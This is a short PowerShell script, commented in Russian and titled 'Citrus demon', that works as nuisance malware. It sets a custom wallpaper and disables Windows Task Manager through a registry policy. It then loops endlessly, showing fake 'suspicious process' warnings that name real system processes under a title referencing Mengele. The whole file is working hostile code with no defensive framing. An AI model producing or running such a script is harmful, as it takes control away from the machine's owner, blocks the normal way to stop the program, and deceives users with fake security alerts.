# Цитрусовый демон — ss.ps1

# Путь к обоям (положи kostyan_wallpaper.jpg в эту папку заранее!)
$wallpaper = "C:\ProgramData\Kostyan\kostyan_wallpaper.jpg"

if (Test-Path $wallpaper) {
    Add-Type -TypeDefinition @"
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaper, 3)
}

# Отключаем диспетчер задач
try {
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
} catch {}

# Бесконечные уведомления в трее
while ($true) {
    $processes = @('explorer.exe', 'svchost.exe', 'chrome.exe', 'firefox.exe', 'notepad.exe', 'Taskmgr.exe',"Nedohackers.sub" )
    $randomProc = $processes | Get-Random
    Add-Type -AssemblyName System.Windows.Forms
    $notify = New-Object System.Windows.Forms.NotifyIcon
    $notify.Icon = [System.Drawing.SystemIcons]::Warning
    $notify.BalloonTipTitle = "Цитрусовый Доктор Менгеле 🍋"
    $notify.BalloonTipText = "Обнаружен подозрительный процесс: $randomProc`nЗавершить его?"
    $notify.Visible = $true
    $notify.ShowBalloonTip(5000)
    Start-Sleep -Seconds (Get-Random -Minimum 4 -Maximum 11)
    $notify.Dispose()
}